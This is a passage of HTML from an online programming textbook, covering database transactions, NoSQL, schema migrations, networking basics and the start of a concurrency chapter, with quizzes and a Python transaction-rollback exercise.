+<p><strong>Phantom read:</strong> Transaction A queries rows matching a condition, B inserts a new matching row and commits, then A re-queries and sees a &ldquo;phantom&rdquo; row that was not there before.</p>
+
+<h3>Deadlocks</h3>
+
+<p>A <strong>deadlock</strong> occurs when two transactions each hold a lock the other needs. Neither can proceed, so they wait forever.</p>
+
+<pre style="overflow-x:auto"><code># Transaction 1:                    Transaction 2:
+# Lock row A                        Lock row B
+# Try to lock row B (WAIT...)       Try to lock row A (WAIT...)
+# ... deadlock!                     ... deadlock!</code></pre>
+
+<p><strong>Prevention strategies:</strong></p>
+<ul>
+<li>Always acquire locks in the same order (e.g., always lock lower ID first)</li>
+<li>Keep transactions short &mdash; less time holding locks means less chance of collision</li>
+<li>Use timeouts so a blocked transaction gives up instead of waiting forever</li>
+<li>Most databases detect deadlocks automatically and roll back one transaction</li>
+</ul>
+
+<h3>Connection Pooling</h3>
+
+<p>Every database connection has overhead: TCP setup, authentication, memory allocation. A <strong>connection pool</strong> maintains pre-opened connections. When your code needs one, it borrows from the pool and returns it when done.</p>
+
+<pre style="overflow-x:auto"><code># Conceptual connection pool (real systems use SQLAlchemy or similar)
+class ConnectionPool:
+    def __init__(self, db_path, pool_size=5):
+        self._available = [sqlite3.connect(db_path) for _ in range(pool_size)]
+        self._in_use = []
+
+    def get_connection(self):
+        if not self._available:
+            raise Exception("No connections available")
+        conn = self._available.pop()
+        self._in_use.append(conn)
+        return conn
+
+    def return_connection(self, conn):
+        self._in_use.remove(conn)
+        self._available.append(conn)</code></pre>
+
+<h3>The NoSQL Landscape</h3>
+
+<p>Relational databases (SQL) are the right choice most of the time. But certain workloads benefit from different data models. There are four main NoSQL categories:</p>
+
+<h4>Document Stores (e.g., MongoDB)</h4>
+
+<p>Store data as JSON-like documents. Each document can have a different structure. Great for content management, user profiles, and catalogs.</p>
+
+<pre style="overflow-x:auto"><code># TaskForge as a document:
+{
+    "_id": "task-001",
+    "title": "Fix login bug",
+    "priority": "high",
+    "assignee": {"name": "Alice", "email": "alice@example.com"},
+    "comments": [
+        {"author": "Bob", "text": "Reproduced on Chrome", "date": "2026-03-15"}
+    ]
+}</code></pre>
+
+<h4>Key-Value Stores (e.g., Redis)</h4>
+
+<p>Simple: a key maps to a value. Extremely fast (often in-memory). Used for caching, session storage, rate limiting.</p>
+
+<h4>Column-Family Stores (e.g., Cassandra)</h4>
+
+<p>Optimised for writing and reading large volumes across many servers. Used for time-series data, IoT logs, event tracking at massive scale.</p>
+
+<h4>Graph Databases (e.g., Neo4j)</h4>
+
+<p>Store data as nodes and edges (relationships). Used for social networks, recommendation engines, fraud detection.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>NoSQL database types and their use cases</caption>
+<thead><tr><th>Type</th><th>Best For</th><th>Not Great For</th><th>Example</th></tr></thead>
+<tbody>
+<tr><td>Document</td><td>Varied schemas, nested data</td><td>Complex joins</td><td>MongoDB, CouchDB</td></tr>
+<tr><td>Key-Value</td><td>Caching, sessions</td><td>Complex queries</td><td>Redis, DynamoDB</td></tr>
+<tr><td>Column-Family</td><td>Write-heavy, time-series</td><td>Ad-hoc queries</td><td>Cassandra, HBase</td></tr>
+<tr><td>Graph</td><td>Highly connected data</td><td>Bulk analytics</td><td>Neo4j, Neptune</td></tr>
+</tbody>
+</table>
+</div>
+
+<div role="note" class="callout warn">
+<div class="callout-title">Myth: NoSQL Is Faster Than SQL</div>
+<p>This is a dangerous oversimplification. NoSQL databases optimise for <em>specific</em> access patterns at the cost of flexibility. A well-indexed PostgreSQL database will outperform MongoDB for most general-purpose workloads. Choose based on your data model and access patterns, not hype. Start with SQL; migrate only when you have a specific reason.</p>
+</div>
+
+<h3>Schema Migrations</h3>
+
+<p>Your database schema will change over time: new columns, renamed fields, new tables. <strong>Schema migrations</strong> are versioned scripts that evolve the structure.</p>
+
+<pre style="overflow-x:auto"><code># Migration 001: initial schema
+"""
+CREATE TABLE tasks (
+    id INTEGER PRIMARY KEY,
+    title TEXT NOT NULL,
+    done BOOLEAN DEFAULT 0
+);
+"""
+
+# Migration 002: add priority column
+"""
+ALTER TABLE tasks ADD COLUMN priority TEXT DEFAULT 'medium';
+"""
+
+# Migration 003: add categories (zero-downtime approach)
+"""
+-- Step 1: Add nullable column (safe, no breaking change)
+ALTER TABLE tasks ADD COLUMN category_id INTEGER;
+-- Step 2: Backfill existing rows (in application code, gradually)
+-- Step 3: Add constraint once all data is valid
+"""</code></pre>
+
+<p><strong>Zero-downtime migrations</strong> follow a careful sequence: add the column as nullable, deploy code that writes to both old and new columns, backfill existing data, then finally add constraints or drop old columns. Never drop a column that running code still reads.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge Connection</div>
+<p>Create a <code>migrations/</code> directory in TaskForge with numbered SQL files. Write a migration that adds a <code>category_id</code> column, creates a categories table, and backfills category assignments. Also sketch out what TaskForge data would look like as a document store &mdash; would it be simpler or more complex?</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">Try This Now &mdash; ACID Thought Experiment</div>
+<p>Imagine TaskForge has a &ldquo;move task to another project&rdquo; feature: (1) remove the task from the old project, (2) add it to the new project, (3) update the task&rsquo;s project_id. What happens if the server crashes after step 1 but before step 3? Write the transaction that makes this safe.</p>
+</div>
+
+<!-- Ch30 Quiz -->
+<div class="quiz" data-ch="30" data-ex="isolation-levels">
+  <h4>Knowledge Check</h4>
+  <p>Which isolation level prevents phantom reads?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">Read Uncommitted</button>
+    <button class="quiz-option" data-correct="false">Read Committed</button>
+    <button class="quiz-option" data-correct="false">Repeatable Read</button>
+    <button class="quiz-option" data-correct="true">Serializable</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch30 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="30" data-ex="transaction-rollback">
+  <div class="exercise-header">
+    <h4>Exercise: Transaction Rollback</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">Use <code>sqlite3</code> to demonstrate transaction rollback. Create an <code>accounts</code> table with two rows (Alice: $1000, Bob: $500). Write a <code>transfer(conn, from_name, to_name, amount)</code> function that moves money atomically. If the sender has insufficient funds, raise <code>ValueError</code> and roll back so no money is lost.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import sqlite3
+
+def setup_accounts():
+    conn = sqlite3.connect(":memory:")
+    conn.execute("""CREATE TABLE accounts (
+        name TEXT PRIMARY KEY,
+        balance REAL NOT NULL
+    )""")
+    conn.execute("INSERT INTO accounts VALUES ('Alice', 1000)")
+    conn.execute("INSERT INTO accounts VALUES ('Bob', 500)")
+    conn.commit()
+    return conn
+
+def transfer(conn, from_name, to_name, amount):
+    """Transfer amount from from_name to to_name.
+    Raise ValueError if insufficient funds (and roll back).
+    Return dict of all balances after the transfer."""
+    # TODO: implement with proper transaction handling
+    pass
+
+def get_balances(conn):
+    """Return dict of name -> balance."""
+    rows = conn.execute("SELECT name, balance FROM accounts").fetchall()
+    return {name: balance for name, balance in rows}
+
+conn = setup_accounts()
+    </script>
+    <script type="text/plain" class="test-code">
+# Test successful transfer
+result = transfer(conn, "Alice", "Bob", 200)
+assert result["Alice"] == 800, f"Alice should have 800, got {result['Alice']}"
+assert result["Bob"] == 700, f"Bob should have 700, got {result['Bob']}"
+
+# Test failed transfer (insufficient funds)
+try:
+    transfer(conn, "Bob", "Alice", 9999)
+    assert False, "Should have raised ValueError for insufficient funds"
+except ValueError:
+    pass  # Expected
+
+# Verify balances unchanged after failed transfer (rollback worked!)
+balances = get_balances(conn)
+assert balances["Alice"] == 800, f"Alice should still be 800, got {balances['Alice']}"
+assert balances["Bob"] == 700, f"Bob should still be 700, got {balances['Bob']}"
+
+# Test another successful transfer
+result2 = transfer(conn, "Bob", "Alice", 100)
+assert result2["Alice"] == 900, f"Alice should have 900, got {result2['Alice']}"
+assert result2["Bob"] == 600, f"Bob should have 600, got {result2['Bob']}"
+print("All transaction tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">Run</button>
+    <button class="ex-check">Check</button>
+    <button class="ex-hint" data-level="0">Hint</button>
+    <button class="ex-reset">Reset</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">First, query the sender's balance. If it is less than amount, raise ValueError before modifying anything.</p>
+    <p class="hint">Use two UPDATE statements: <code>UPDATE accounts SET balance = balance - ? WHERE name = ?</code> and the corresponding addition. Call conn.commit() after both succeed.</p>
+    <p class="hint">Wrap the updates in try/except. In the except block, call conn.rollback() and re-raise. Return get_balances(conn) at the end of a successful transfer.</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 31 ===== -->
+<section id="ch31" data-ch="31">
+<h2><span class="ch-label">Chapter 31</span> Networking &amp; the Internet</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">Why This Matters Now</div>
+<p>Every API call, every <code>git push</code>, every web page load travels across a network. When your TaskForge API is slow, is it the code, the database, or the network? Understanding how the internet works gives you the ability to diagnose problems that are invisible to someone who only knows application-level code.</p>
+</div>
+
+<h3>The TCP/IP Stack</h3>
+
+<p>The internet is built in <strong>layers</strong>. Each layer has a specific job and communicates with the layers above and below it.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Internet protocol stack layers</caption>
+<thead><tr><th>Layer</th><th>Name</th><th>What It Does</th><th>Protocols</th></tr></thead>
+<tbody>
+<tr><td>5</td><td><strong>Application</strong></td><td>What your code talks to &mdash; web requests, DNS, email</td><td>HTTP, HTTPS, DNS, SMTP, SSH</td></tr>
+<tr><td>4</td><td><strong>Transport</strong></td><td>Reliable (TCP) or fast (UDP) delivery between processes</td><td>TCP, UDP</td></tr>
+<tr><td>3</td><td><strong>Network</strong></td><td>Routes packets between networks using IP addresses</td><td>IP (IPv4, IPv6)</td></tr>
+<tr><td>2</td><td><strong>Link</strong></td><td>Frames data for the local network</td><td>Ethernet, Wi-Fi</td></tr>
+<tr><td>1</td><td><strong>Physical</strong></td><td>Electrical/optical signals on the wire or airwaves</td><td>Cables, radio, fibre</td></tr>
+</tbody>
+</table>
+</div>
+
+<p>As a developer, you spend most of your time in layers 4 and 5. But when debugging latency or connection failures, understanding the lower layers helps you ask the right questions.</p>
+
+<h3>DNS &mdash; Turning Names into Addresses</h3>
+
+<p>When you type <code>api.taskforge.dev</code> into a browser, your computer asks a <strong>DNS</strong> (Domain Name System) server to translate the human-readable name into an IP address like <code>93.184.216.34</code>.</p>
+
+<p>The resolution chain: check local cache &rarr; ask your DNS resolver &rarr; root nameservers &rarr; TLD nameservers (.dev) &rarr; authoritative nameserver &rarr; IP returned and cached with a <strong>TTL</strong> (Time to Live).</p>
+
+<pre style="overflow-x:auto"><code># Debugging DNS from the terminal
+$ dig api.taskforge.dev
+
+;; ANSWER SECTION:
+api.taskforge.dev.   300   IN    A    93.184.216.34
+#                    TTL         Type  IP address</code></pre>
+
+<h3>TCP vs. UDP</h3>
+
+<p><strong>TCP</strong> (Transmission Control Protocol) provides reliable, ordered delivery using a <strong>three-way handshake</strong>:</p>
+
+<ol>
+<li><strong>SYN:</strong> Client says &ldquo;I want to connect&rdquo;</li>
+<li><strong>SYN-ACK:</strong> Server says &ldquo;OK, acknowledged. I also want to connect.&rdquo;</li>
+<li><strong>ACK:</strong> Client says &ldquo;Acknowledged. We are connected.&rdquo;</li>
+</ol>
+
+<p>After this handshake, data flows reliably. Lost packets are retransmitted. Out-of-order packets are reordered.</p>
+
+<p><strong>UDP</strong> (User Datagram Protocol) skips the handshake entirely. It fires packets and hopes they arrive. Faster but unreliable.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>TCP vs. UDP feature comparison</caption>
+<thead><tr><th>Feature</th><th>TCP</th><th>UDP</th></tr></thead>
+<tbody>
+<tr><td>Connection setup</td><td>Three-way handshake</td><td>None (connectionless)</td></tr>
+<tr><td>Reliability</td><td>Guaranteed delivery, ordered</td><td>Best-effort, may lose packets</td></tr>
+<tr><td>Speed</td><td>Slower (overhead)</td><td>Faster (no overhead)</td></tr>
+<tr><td>Use cases</td><td>Web, email, file transfer, APIs</td><td>Video streaming, gaming, DNS, VoIP</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>HTTP Deep Dive</h3>
+
+<p>HTTP is the application-layer protocol that powers the web and most APIs. You used it in Chapter 13; now let us go deeper.</p>
+
+<h4>Methods</h4>
+
+<div style="overflow-x:auto">
+<table>
+<caption>HTTP methods and their properties</caption>
+<thead><tr><th>Method</th><th>Purpose</th><th>Has Body?</th><th>Idempotent?</th></tr></thead>
+<tbody>
+<tr><td><strong>GET</strong></td><td>Retrieve a resource</td><td>No</td><td>Yes</td></tr>
+<tr><td><strong>POST</strong></td><td>Create a new resource</td><td>Yes</td><td>No</td></tr>
+<tr><td><strong>PUT</strong></td><td>Replace a resource entirely</td><td>Yes</td><td>Yes</td></tr>
+<tr><td><strong>PATCH</strong></td><td>Partially update a resource</td><td>Yes</td><td>No*</td></tr>
+<tr><td><strong>DELETE</strong></td><td>Remove a resource</td><td>Optional</td><td>Yes</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>Idempotent</strong> means calling it multiple times produces the same result. Sending the same PUT request twice gives the same resource state. Sending POST twice might create two resources.</p>
+
+<h4>Status Codes</h4>
+
+<pre style="overflow-x:auto"><code># 2xx &mdash; Success
+200 OK                  # Request succeeded
+201 Created             # Resource created (after POST)
+204 No Content          # Success, nothing to return (after DELETE)
+
+# 3xx &mdash; Redirection
+301 Moved Permanently   # Update your URL
+304 Not Modified        # Cached version is still valid
+
+# 4xx &mdash; Client Error (your fault)
+400 Bad Request         # Malformed request
+401 Unauthorized        # Not authenticated (who are you?)
+403 Forbidden           # Authenticated but not authorised (you can't do that)
+404 Not Found           # Resource does not exist
+429 Too Many Requests   # Rate limited
+
+# 5xx &mdash; Server Error (their fault)
+500 Internal Error      # Generic server failure
+502 Bad Gateway         # Proxy got bad response from upstream
+503 Service Unavailable # Server overloaded or in maintenance</code></pre>
+
+<h4>Headers, Cookies &amp; Sessions</h4>
+
+<p><strong>Headers</strong> carry metadata: <code>Content-Type</code> (format of the body), <code>Authorization</code> (credentials), <code>Accept</code> (what formats the client understands).</p>
+
+<p><strong>Cookies</strong> are small data pieces the server stores on the client via the <code>Set-Cookie</code> header. They are sent automatically with every subsequent request to that domain.</p>
+
+<p><strong>Sessions</strong> pair a cookie (containing a session ID) with server-side data. The server creates a session on login, gives you a cookie with the ID, and on later requests, looks up your session to know who you are.</p>
+
+<h4>HTTP/2 Improvements</h4>
+
+<p>HTTP/2 introduced multiplexing (multiple requests over a single connection), header compression, and server push. You do not need to change your code &mdash; it is handled by the web server and browser automatically.</p>
+
+<h3>TLS/HTTPS</h3>
+
+<p><strong>TLS</strong> (Transport Layer Security) encrypts the connection between client and server. HTTPS is HTTP over TLS. The simplified handshake:</p>
+
+<ol>
+<li>Client sends &ldquo;Hello&rdquo; with supported cipher suites</li>
+<li>Server sends its <strong>certificate</strong> (proves identity) and chosen cipher</li>
+<li>Client verifies certificate against trusted Certificate Authorities</li>
+<li>Both sides exchange keys using <strong>asymmetric encryption</strong> (slow, one-time)</li>
+<li>Both switch to <strong>symmetric encryption</strong> (fast) for the rest of the session</li>
+</ol>
+
+<h3>WebSockets</h3>
+
+<p>Regular HTTP is request/response. For real-time features, you need the server to <em>push</em> data to the client. <strong>WebSockets</strong> upgrade an HTTP connection into a persistent, full-duplex channel where both sides can send messages at any time.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Real-time communication approaches compared</caption>
+<thead><tr><th>Approach</th><th>How It Works</th><th>Best For</th></tr></thead>
+<tbody>
+<tr><td><strong>Polling</strong></td><td>Client asks every N seconds</td><td>Simple dashboards, low-frequency</td></tr>
+<tr><td><strong>Server-Sent Events</strong></td><td>Server pushes a one-directional stream</td><td>News feeds, live scores</td></tr>
+<tr><td><strong>WebSockets</strong></td><td>Full-duplex; both sides send anytime</td><td>Chat, gaming, collaborative editing</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- HTTP Request Journey SVG -->
+<svg viewBox="0 0 720 220" aria-label="Journey of an HTTP request: browser performs DNS lookup, then TCP handshake, then TLS handshake, sends the HTTP request, server processes it, and sends the HTTP response back" style="width:100%;max-width:720px;margin:1.5rem auto;display:block">
+  <rect x="5" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="50" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">1. DNS</text>
+  <text x="50" y="83" class="sub-text" text-anchor="middle" font-size="9">Name &rarr; IP</text>
+
+  <rect x="118" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="163" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">2. TCP</text>
+  <text x="163" y="83" class="sub-text" text-anchor="middle" font-size="9">SYN/ACK</text>
+
+  <rect x="231" y="45" width="90" height="52" rx="6" class="node-accent" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="276" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">3. TLS</text>
+  <text x="276" y="83" class="sub-text" text-anchor="middle" font-size="9">Cert + encrypt</text>
+
+  <rect x="344" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="389" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">4. HTTP</text>
+  <text x="389" y="83" class="sub-text" text-anchor="middle" font-size="9">GET /tasks</text>
+
+  <rect x="457" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="502" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">5. Server</text>
+  <text x="502" y="83" class="sub-text" text-anchor="middle" font-size="9">Process request</text>
+
+  <rect x="570" y="45" width="110" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="625" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">6. Response</text>
+  <text x="625" y="83" class="sub-text" text-anchor="middle" font-size="9">200 OK + JSON</text>
+
+  <line x1="95" y1="71" x2="118" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="208" y1="71" x2="231" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="321" y1="71" x2="344" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="434" y1="71" x2="457" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="547" y1="71" x2="570" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <text x="50" y="33" class="sub-text" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="600">Browser</text>
+  <text x="502" y="33" class="sub-text" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="600">Server</text>
+
+  <path d="M625,97 L625,135 L50,135 L50,125" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead)"/>
+  <text x="350" y="153" class="sub-text" text-anchor="middle" font-size="10">Response travels back through the same layers</text>
+
+  <text x="350" y="183" class="sub-text" text-anchor="middle" font-size="11">First request: 50&ndash;300ms (DNS + TCP + TLS)</text>
+  <text x="350" y="201" class="sub-text" text-anchor="middle" font-size="11">Subsequent: 10&ndash;100ms (TCP/TLS reused via keep-alive)</text>
+</svg>
+
+<h3>Debugging Tools</h3>
+
+<pre style="overflow-x:auto"><code># curl &mdash; the Swiss Army knife of HTTP debugging
+$ curl https://api.taskforge.dev/tasks          # GET request
+$ curl -v https://api.taskforge.dev/tasks       # Verbose: headers, TLS info
+$ curl -I https://api.taskforge.dev/tasks       # HEAD: headers only
+$ curl -X POST -H "Content-Type: application/json" \
+       -d '{"title":"New task"}' \
+       https://api.taskforge.dev/tasks          # POST with JSON
+
+# dig &mdash; DNS debugging
+$ dig api.taskforge.dev                          # Full DNS record
+$ dig +short api.taskforge.dev                   # Just the IP
+
+# traceroute &mdash; see the network path
+$ traceroute api.taskforge.dev                   # Shows each hop</code></pre>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge Connection</div>
+<p>Trace a TaskForge API call through all network layers. Run <code>curl -v http://localhost:5000/tasks</code> and identify each stage: TCP handshake, HTTP request headers sent, response status, response body. The <code>-v</code> flag reveals everything.</p>
+</div>
+
+<div class="pq">"The network is the computer." &mdash; John Gage, Sun Microsystems</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">Try This Now &mdash; Read curl Verbose Output</div>
+<p>Run <code>curl -v https://httpbin.org/get</code> in your terminal. Identify: (1) DNS resolution, (2) TCP connection, (3) TLS handshake details, (4) request headers, (5) response status code, (6) response headers. Write down what each section tells you.</p>
+</div>
+
+<!-- Ch31 Quiz: TCP -->
+<div class="quiz" data-ch="31" data-ex="tcp-handshake">
+  <h4>Knowledge Check</h4>
+  <p>What happens during a TCP three-way handshake?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">Client sends data, server acknowledges, client sends more data</button>
+    <button class="quiz-option" data-correct="true">Client sends SYN, server replies SYN-ACK, client sends ACK</button>
+    <button class="quiz-option" data-correct="false">Client and server exchange encryption keys three times</button>
+    <button class="quiz-option" data-correct="false">Client sends request, server sends response, client confirms receipt</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch31 Quiz: Status codes -->
+<div class="quiz" data-ch="31" data-ex="http-status-codes">
+  <h4>Knowledge Check</h4>
+  <p>Which HTTP status code means the server understood the request but refuses to authorise it?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">401 Unauthorized</button>
+    <button class="quiz-option" data-correct="true">403 Forbidden</button>
+    <button class="quiz-option" data-correct="false">404 Not Found</button>
+    <button class="quiz-option" data-correct="false">400 Bad Request</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch31 Checklist -->
+<div class="checklist" data-ch="31" data-ex="networking-understanding">
+  <h4>Networking Mastery Checklist</h4>
+  <label><input type="checkbox"><span>I can explain the difference between TCP and UDP and when to use each</span></label>
+  <label><input type="checkbox"><span>I can describe how DNS translates a domain name to an IP address</span></label>
+  <label><input type="checkbox"><span>I can use <code>curl -v</code> to debug an API call and read the output</span></label>
+  <label><input type="checkbox"><span>I can explain the difference between 401 and 403 status codes</span></label>
+  <label><input type="checkbox"><span>I can describe what TLS does and why HTTPS matters</span></label>
+  <label><input type="checkbox"><span>I know when to use WebSockets vs. polling vs. Server-Sent Events</span></label>
+  <label><input type="checkbox"><span>I can trace an HTTP request through all network layers</span></label>
+</div>
+
+</section>
+
+
+<!-- ===== CH 32 ===== -->
+<section id="ch32" data-ch="32">
+<h2><span class="ch-label">Chapter 32</span> Concurrency &amp; Parallelism</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">Why This Matters Now</div>
+<p>Modern applications do many things at once: handling multiple web requests, fetching data from several APIs simultaneously, processing files while keeping the UI responsive. Understanding concurrency lets you build applications that do not freeze, do not lose data, and make full use of modern hardware.</p>
+</div>
+
+<h3>Three Models: Processes, Threads, Async</h3>
+
+<p>Python offers three fundamental ways to do multiple things at once. Each is suited for different situations.</p>
+
+<p><strong>Processes</strong> are fully independent programs running in separate memory spaces. They can truly run in parallel on multiple CPU cores. But they are expensive to create and communicating between them is complex.</p>
+
+<p><strong>Threads</strong> are lightweight execution units within a single process. They share memory, making communication easy but dangerous (race conditions). In Python, the GIL limits their effectiveness for CPU-bound work.</p>
+
+<p><strong>Async/await</strong> (cooperative multitasking) uses a single thread but switches between tasks whenever one is waiting for I/O. Extremely efficient for I/O-bound work but cannot speed up CPU-bound tasks.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Choosing a concurrency model by workload type</caption>
+<thead><tr><th>Workload</th><th>Best Model</th><th>Why</th></tr></thead>
+<tbody>
+<tr><td>1000 concurrent API requests</td><td><strong>Async/await</strong></td><td>I/O-bound; async handles waiting efficiently</td></tr>
+<tr><td>Process 1000 images</td><td><strong>Multiprocessing</strong></td><td>CPU-bound; needs true parallelism</td></tr>
+<tr><td>Shared in-memory cache</td><td><strong>Threading</strong> (with locks)</td><td>Shared memory is convenient</td></tr>
+<tr><td>Background cleanup job</td><td><strong>Thread or process</strong></td><td>Runs independently</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- Concurrency SVG Diagram -->
+<svg viewBox="0 0 700 300" aria-label="Diagram comparing sequential execution where all tasks run one after another, concurrent execution where tasks are interleaved on one core, and parallel execution where tasks run simultaneously on separate cores" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <text x="100" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Sequential</text>
+  <text x="360" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Concurrent</text>
+  <text x="590" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Parallel</text>
+
+  <!-- Sequential -->
+  <text x="15" y="62" class="sub-text" font-size="10">Core 1</text>
+  <rect x="50" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.8"/>
+  <text x="90" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task A</text>
+  <rect x="130" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.55"/>
+  <text x="170" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task B</text>
+  <rect x="210" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.35"/>
+  <text x="250" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task C</text>
+  <text x="100" y="93" class="sub-text" text-anchor="middle" font-size="10">Total: 3 time units</text>
+
+  <!-- Concurrent -->
+  <text x="265" y="140" class="sub-text" font-size="10">Core 1</text>
+  <rect x="300" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="314" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">A</text>
+  <rect x="328" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="342" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">B</text>
+  <rect x="356" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="370" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">C</text>
+  <rect x="384" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="398" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">A</text>
+  <rect x="412" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="426" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">B</text>
+  <rect x="440" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="454" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">C</text>
+  <text x="360" y="172" class="sub-text" text-anchor="middle" font-size="10">Still ~3 units, but all tasks make progress</text>
+
+  <!-- Parallel -->
+  <text x="510" y="215" class="sub-text" font-size="10">Core 1</text>
+  <rect x="550" y="200" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="610" y="215" text-anchor="middle" font-size="10" fill="var(--bg)">Task A</text>
+
+  <text x="510" y="242" class="sub-text" font-size="10">Core 2</text>
+  <rect x="550" y="227" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="610" y="242" text-anchor="middle" font-size="10" fill="var(--bg)">Task B</text>
+
+  <text x="510" y="269" class="sub-text" font-size="10">Core 3</text>
+  <rect x="550" y="254" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="610" y="269" text-anchor="middle" font-size="10" fill="var(--bg)">Task C</text>
+
+  <text x="590" y="295" class="sub-text" text-anchor="middle" font-size="10">Total: ~1 time unit (3x speedup)</text>
+
+  <line x1="230" y1="10" x2="230" y2="290" stroke="var(--a5)" stroke-width="1" stroke-dasharray="4,4"/>
+  <line x1="480" y1="10" x2="480" y2="290" stroke="var(--a5)" stroke-width="1" stroke-dasharray="4,4"/>
+</svg>
+
+<h3>Python&rsquo;s GIL</h3>
+
+<p>The <strong>Global Interpreter Lock (GIL)</strong> is a mutex in CPython that ensures only one thread executes Python bytecode at a time. This means threads cannot achieve true parallelism for CPU-bound work.</p>
+
+<p><strong>What the GIL prevents:</strong> Two threads crunching numbers simultaneously on different cores.</p>
+
+<p><strong>What the GIL does NOT prevent:</strong> I/O-bound concurrency. When a thread waits for a network response or disk read, it releases the GIL, letting other threads run. This is why threading still works well for I/O tasks.</p>
+
+<pre style="overflow-x:auto"><code>import threading
+import time
+
+# I/O-bound: threading helps (GIL released during sleep/network)
+def fetch_data(url):
+    time.sleep(1)  # Simulates network I/O
+    return f"Data from {url}"
+
+# CPU-bound: threading does NOT help (GIL blocks parallelism)
+def compute_heavy(n):
+    total = 0
+    for i in range(n):
+        total += i * i
+    return total</code></pre>
+
+<h3>Threading</h3>
+
+<p>Python&rsquo;s <code>threading</code> module lets you run functions concurrently. But shared state between threads is dangerous without synchronisation.</p>
+
+<pre style="overflow-x:auto"><code>import threading
+
+counter = 0  # Shared state &mdash; danger!
+
+def increment():
+    global counter
+    for _ in range(100000):
+        counter += 1  # NOT thread-safe!
+
+t1 = threading.Thread(target=increment)
+t2 = threading.Thread(target=increment)
+t1.start(); t2.start()
+t1.join(); t2.join()
+
+print(counter)  # Expected: 200000. Actual: something less!</code></pre>
+
+<p>The fix is a <strong>lock</strong>:</p>
+
